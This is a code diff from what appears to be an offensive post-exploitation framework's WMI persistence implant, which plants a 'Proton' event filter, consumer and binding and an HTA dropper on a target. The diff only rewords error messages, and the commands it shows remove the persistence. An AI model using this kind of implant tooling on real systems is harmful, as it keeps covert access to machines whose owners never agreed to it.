@@ -47,7 +47,7 @@ class WMIPersistJob(core.job.Job):
                 self.shell.print_good("__EventFilter created!")
                 self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"Proton\" DELETE")
             else:
-                self.shell.print_error("__EventFilter could not be created, this implant will probably fail :/")
+                self.shell.print_error("__EventFilter could not be created, this implant will probably fail!")
             return
 
         if task == "CreateConsumer":
@@ -56,7 +56,7 @@ class WMIPersistJob(core.job.Job):
                 self.shell.print_good("CommandLineEventConsumer created!")
                 self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"Proton\" DELETE")
             else:
-                self.shell.print_error("CommandLineEventConsumer could not be created, this implant will probably fail :/")
+                self.shell.print_error("CommandLineEventConsumer could not be created, this implant will probably fail!")
             return
 
         if task == "CreateBinding":
@@ -65,7 +65,7 @@ class WMIPersistJob(core.job.Job):
                 self.shell.print_good("__FilterToConsumerBinding created! Persistence has been established! If the target reboots, a session should come back 4-5 minutes later :)")
                 self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding WHERE \"__PATH like '%Proton%'\" DELETE")
             else:
-                self.shell.print_error("__FilterToConsumerBinding could not be created, this implant will probably fail :/")
+                self.shell.print_error("__FilterToConsumerBinding could not be created, this implant will probably fail!")
             return
 
         if task == "RemovePersistence":
@@ -73,7 +73,7 @@ class WMIPersistJob(core.job.Job):
             if data:
                 self.shell.print_good("Persistence removed successfully.")
             else:
-                self.shell.print_error("Could not remove persistence :/")
+                self.shell.print_error("Could not remove persistence!")
                 self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"Proton\" DELETE")
                 self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"Proton\" DELETE")
                 self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding WHERE \"__PATH like '%Proton%'\" DELETE")
@@ -85,7 +85,7 @@ class WMIPersistJob(core.job.Job):
                 self.shell.print_good("HTA file dropped at "+data.split("~~~")[1].split()[0])
                 self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
             else:
-                self.shell.print_error("HTA file could not be dropped. Consider cleaning up and choosing a different DROPDIR.")
+                self.shell.print_error("HTA file could not be dropped!")
             return
 
         if task == "DeleteDropper":
@@ -93,7 +93,7 @@ class WMIPersistJob(core.job.Job):
             if "false" in data.split("~~~")[0]:
                 self.shell.print_good("HTA file deleted from "+data.split("~~~")[1].split()[0])
             else:
-                self.shell.print_error("HTA file could not be deleted.")
+                self.shell.print_error("HTA file could not be deleted!")
                 self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
             return
 
@@ -138,7 +138,7 @@ class WMIPersistImplant(core.implant.Implant):
         payload = self.load_payload(id)
 
         if payload is None:
-            self.shell.print_error("No such stager: %s" % id)
+            self.shell.print_error("No such stager!")
             return
 
         payloads = {}
